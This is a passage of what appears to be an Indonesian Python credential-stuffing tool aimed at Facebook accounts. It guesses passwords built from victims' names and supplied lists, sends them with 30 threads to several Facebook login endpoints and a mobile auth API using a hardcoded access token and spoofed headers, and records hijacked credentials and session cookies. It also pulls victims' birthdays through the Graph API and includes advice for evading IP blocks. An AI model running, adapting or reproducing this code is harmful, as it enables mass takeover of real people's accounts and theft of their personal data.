				fall.submit(crack, uid, pwx,"https://mbasic.facebook.com")
		exit("\n\n [#] crack selesai...")
	elif ask=="3":
		print(' [+] hasil OK disimpan ke -> ok.json')
		print(' [+] hasil CP disimpan ke -> cp.json')
		print('──────────────────────────────────────────')
		with ThreadPoolExecutor(max_workers=30) as fall:
			for user in id:
				uid, name = user.split("<=>")
				nam = name.split(' ')
				if len(name) == 3 or len(name) == 4 or len(name) == 5:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				else:
					pwx = [name, nam[0]+"123", nam[0]+"12345",pwek.split(",")]
				fall.submit(crack, uid, pwx,"https://m.facebook.com")
		exit("\n\n [#] crack selesai...")
	
### CRACK API ###
def api(uid, pwx):
	try:
		ua = open("ugent.json", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	for pw in pwx:
		pw = pw.lower()
		headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
		send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
		if "session_key" in send.text and "EAAA" in send.text:
			print("\r %s[OK] %s|%s|%s"%(H,uid, pw, send.json()["access_token"]))
			ok.append("%s|%s"%(uid, pw))
			open("OK/%s.json"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
			break
		elif "www.facebook.com" in send.json()["error_msg"]:
			if "y" in opsi:
				try:
					token = open("login/token.json", "r").read()
					cookie = {'cookie':open('login/cookie.json','r').read()}
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
					month, day, year = ttl.split("/")
					month = _bulan_[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				ceker(uid,pw,ua)
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
			elif "t" in opsi:
				try:
					token = open("login/token.txt", "r").read()
					cookie = {'cookie':open('login/cookie.json','r').read()}
					ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cook).json()["birthday"]
					month, day, year = ttl.split("/")
					month = _bulan_[month]
					print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
					break
				except (KeyError, IOError):
					day = (" ")
					month = (" ")
					year = (" ")
				except:pass
				print("\r %s[CP] %s|%s        "%(K,uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
				break
		elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in send.text:
			print("\r %s[!] IP anda terblokir, aktifkan mode pesawat 2 detik"%(M)),
			c+=1
			sys.stdout.flush()
			api(uid, pwx)
		else:
			continue

	loop += 1

### CRACK MBASIC M FB ###
def crack(uid, pwx, host, **kwargs):
	try:
		ua = open("ugent.json", "r").read()
	except IOError:
		ua = ("Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]")
	global ok, cp, loop, token, cookie
	sys.stdout.write(
		"\r %s[*] [crack] %s/%s OK:-%s - CP:-%s "%(N,loop, len(id), len(ok), len(cp))
	); sys.stdout.flush()
	try:
		for pw in pwx:
			kwargs = {}
			pw = pw.lower()
			ses = requests.Session()
			ses.headers.update({"origin": host, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",host)), "referer": host+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"})
			p = ses.get(host+"/login/?next&ref=dbl&refid=8").text
			b = parser(p,"html.parser")
			bl = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
			for i in b("input"):
				try:
					if i.get("name") in bl:kwargs.update({i.get("name"):i.get("value")})
					else:continue
				except:pass
			kwargs.update({"email": uid,"pass": pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")
				print("\r %s[OK] %s|%s|%s"%(H,uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.json"%(tanggal),"a").write(" [OK] %s|%s\n"%(uid, pw))
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				if "y" in opsi:
					try:
						token = open("login/token.json", "r").read()
						cookie = {'cookie':open('login/cookie.json','r').read()}
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token),cookies=cookie).json()["birthday"]
						month, day, year = ttl.split("/")
						month = _bulan_[month]
						print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
					except (KeyError, IOError):
						day = (" ")
						month = (" ")
						year = (" ")
					except:pass
					ceker(uid,pw,ua)
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
					break
				elif "t" in opsi:
					try:
						token = open("login/token.json", "r").read()
						cookie = {'cookie':open('login/cookie.json','r').read()}
						ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
						month, day, year = ttl.split("/")
						month = _bulan_
						print("\r %s[CP] %s|%s|%s %s %s"%(K,uid, pw, day, month, year))
						cp.append("%s|%s"%(uid, pw))
						open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
						break
					except (KeyError, IOError):
						day = (" ")
						month = (" ")
						year = (" ")
					except:pass
					print("\r %s[CP] %s|%s        "%(K,uid, pw))
					cp.append("%s|%s"%(uid, pw))
					open("CP/%s.json"%(tanggal),"a").write(" [CP] %s|%s\n"%(uid, pw))
					break
			else:
				continue

		loop+=1
	except Exception as e:
		if "free.facebook.com" in host:
			return crack(uid, pwx, host)
		else:
			return crack(uid, pwx, "https://free.facebook.com")
def ceker(uid,pw,ua):
	mb = ("https://mbasic.facebook.com")
	ses = requests.Session()
	option = []
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print("\r %s[CP] %s|%s        "%(K,uid, pw))
		for opt in range(len(ngew)):
			print("  "+N+"["+str(opt+1)+"]. "+ngew[opt]+" ")
		if "0" in str(len(ngew)):
			print("\r %s[✓] akun tap yes, login di lite       "%(H))
	elif "login_error" in str(run):
		print("\r %s[CP] %s|%s        "%(K,uid, pw))
	else:
		print("\r %s[CP] %s|%s        "%(K,uid, pw))

if __name__=='__main__':
	os.system('git pull')
	mkdir_data_login()
	menu()